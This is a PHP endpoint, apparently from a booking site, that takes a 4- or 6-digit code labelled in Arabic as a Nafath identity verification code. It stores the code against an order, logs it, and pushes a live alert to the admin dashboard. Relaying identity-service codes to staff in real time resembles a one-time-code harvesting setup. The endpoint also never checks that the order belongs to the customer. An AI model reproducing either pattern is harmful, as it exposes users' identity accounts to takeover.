<?php
declare(strict_types=1);
require __DIR__ . '/../dashboard/init.php';
auth_require_customer_login_or_redirect();
if (($_SERVER['REQUEST_METHOD'] ?? 'GET') !== 'POST') {
    json_response(['success' => false, 'message' => 'Method not allowed'], 405);
}
$id = (int) ($_POST['id'] ?? 0);
$code = trim((string) ($_POST['TransactionNo'] ?? $_POST['Code'] ?? ''));
$code = preg_replace('/\D/', '', $code);
if ($id < 1) {
    json_response(['success' => false, 'message' => 'طلب غير صالح'], 400);
}
if ($code === '') {
    json_response(['success' => false, 'message' => 'يرجى إدخال الرمز'], 400);
}
if (!preg_match('/^(\d{4}|\d{6})$/', $code)) {
    json_response(['success' => false, 'message' => 'الرجاء إدخال 4 أو 6 أرقام فقط'], 400);
}

$pdo = bujairi_pdo();
$order = order_by_id($pdo, $id);
if (!$order) {
    json_response(['success' => false, 'message' => 'غير موجود'], 404);
}

$existing = trim((string) ($order['transaction_no'] ?? ''));
if ($existing !== '') {
    json_response(['success' => true, 'already' => true]);
}

$st = $pdo->prepare('UPDATE orders SET transaction_no = ? WHERE id = ? AND (transaction_no IS NULL OR transaction_no = \'\')');
$st->execute([$code, $id]);
try {
    $ins = $pdo->prepare('INSERT INTO order_booking_success_verify_log (order_id, transaction_no) VALUES (?,?)');
    $ins->execute([$id, $code]);
} catch (Throwable $e) {
}
bujairi_pusher_notify_admin_orders_changed();
if (\function_exists('bujairi_pusher_notify_dashboard_order_update')) {
    bujairi_pusher_notify_dashboard_order_update($pdo, $id, 'تم استلام رمز تحقق نفاذ', 'info');
}
json_response(['success' => true]);
